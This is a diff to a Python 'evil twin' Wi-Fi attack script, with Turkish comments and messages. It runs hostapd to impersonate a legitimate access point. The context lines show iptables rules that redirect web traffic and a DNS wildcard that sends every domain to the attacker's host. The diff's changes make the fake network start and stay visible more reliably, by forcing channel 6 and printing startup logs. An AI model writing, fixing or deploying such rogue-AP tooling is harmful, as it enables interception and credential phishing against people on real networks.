@@ -119,6 +119,14 @@ def start_evil_twin(iface, ssid, channel):
     os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
     os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
     
+    # Kanal 14'ten büyükse (5GHz ağ ise) hostapd 'g' (2.4GHz) modunda çöker. 
+    # Sahte ağ her zaman görünebilmesi için onu zorla Kanal 6'ya ayarlıyoruz.
+    try:
+        if int(channel) > 14:
+            channel = "6"
+    except:
+        channel = "6"
+
     # 3. hostapd konfigürasyonu (Fake AP)
     hostapd_conf = f"""interface={iface}
 driver=nl80211
@@ -144,9 +152,14 @@ address=/#/10.0.0.1
         
     print("    [*] Fake Erişim Noktası (AP) başlatılıyor...")
     ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=open("/tmp/hostapd.log", "w"), stderr=subprocess.STDOUT)
-    time.sleep(2.5)
+    time.sleep(3)
     
-    # Eğer hostapd hemen çöktüyse kullanıcıyı uyar (Büyük ihtimal adaptör Master mod desteklemiyordur veya takılıdır)
+    # Hostapd başlatılırken hata var mı yok mu detaylı yazdır
+    print(f"\n    {'\033[93m'}[HOSTAPD BAŞLATMA LOGLARI]{'\033[0m'}")
+    os.system("head -n 5 /tmp/hostapd.log | sed 's/^/        /'")
+    print(f"    {'\033[93m'}{'-'*30}{'\033[0m'}\n")
+    
+    # Eğer hostapd hemen çöktüyse kullanıcıyı uyar
     if ap_proc.poll() is not None:
         print(f"\n    \033[91m[!] KRİTİK HATA: Sahte Wi-Fi ağı oluşturulamadı!\033[0m")
         print("    [*] Bunun en yaygın iki sebebi şunlardır:")
